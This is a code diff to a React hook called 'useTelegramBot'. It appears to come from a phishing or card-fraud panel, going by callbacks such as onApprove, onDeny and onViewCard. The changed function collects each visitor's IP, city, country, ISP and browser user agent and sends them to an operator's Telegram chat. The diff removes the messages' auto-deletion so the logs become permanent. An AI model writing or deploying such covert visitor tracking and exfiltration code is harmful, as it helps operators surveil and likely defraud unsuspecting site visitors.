@@ -299,22 +299,22 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
   };
 
   const sendSiteEntryLog = async () => {
-    if (!shouldSendLog('siteEntry')) return;
+  if (!shouldSendLog('siteEntry')) return;
+  try {
+    let userIP = 'Unable to get IP';
+    
     try {
-      let userIP = 'Unable to get IP';
-      
-      try {
-        const ipResponse = await axios.get('https://api.ipify.org?format=json');
-        userIP = ipResponse.data.ip;
-      } catch (ipError) {
-        console.error('Error getting IP:', ipError);
-      }
-      
-      // ✅ Use the new helper function with fallback
-      const { country, city, isp } = await getGeoData(userIP);
-      
-      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-      const message = `🌍 <b>SITE ENTRY - VISITOR</b> 🌍
+      const ipResponse = await axios.get('https://api.ipify.org?format=json');
+      userIP = ipResponse.data.ip;
+    } catch (ipError) {
+      console.error('Error getting IP:', ipError);
+    }
+    
+    // ✅ Use the new helper function with fallback
+    const { country, city, isp } = await getGeoData(userIP);
+    
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const message = `🌍 <b>SITE ENTRY - VISITOR</b> 🌍
 ━━━━━━━━━━━━━━━━━━━━━
 📱 <b>Event:</b> Someone entered the website
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
@@ -325,26 +325,19 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
 ├ 🏙️ <b>City:</b> ${city}
 └ 📡 <b>ISP:</b> ${isp}
 ━━━━━━━━━━━━━━━━━━━━━
-🖥️ <b>Device:</b> ${navigator.userAgent.substring(0, 80)}
-━━━━━━━━━━━━━━━━━━━━━
-⚠️ <i>A visitor is on your website!</i>
-⏰ <i>This message will self-delete in 3 minute</i>`;
-      
-      const response = await axios.post(url, { 
-        chat_id: LOGS_CHAT_ID, 
-        text: message, 
-        parse_mode: 'HTML' 
-      });
-      
-      const messageId = response.data.result.message_id;
-      deleteMessageAfterDelay(LOGS_CHAT_ID, messageId, 180000);
-      
-      console.log('✅ Site entry log sent with location and ISP');
-    } catch (error) {
-      console.error('Error sending site entry log:', error);
-    }
-  };
-
+🖥️ <b>Device:</b> ${navigator.userAgent.substring(0, 80)}`;
+    
+    await axios.post(url, { 
+      chat_id: LOGS_CHAT_ID, 
+      text: message, 
+      parse_mode: 'HTML' 
+    });
+    
+    console.log('✅ Site entry log sent with location and ISP (PERMANENT)');
+  } catch (error) {
+    console.error('Error sending site entry log:', error);
+  }
+};
   const sendVisitNotification = async (ipAddress, userAgent, referrer, screenResolution, timezone, sessionId, language) => {
     if (!shouldSendLog('visitNotification')) return;
     try {
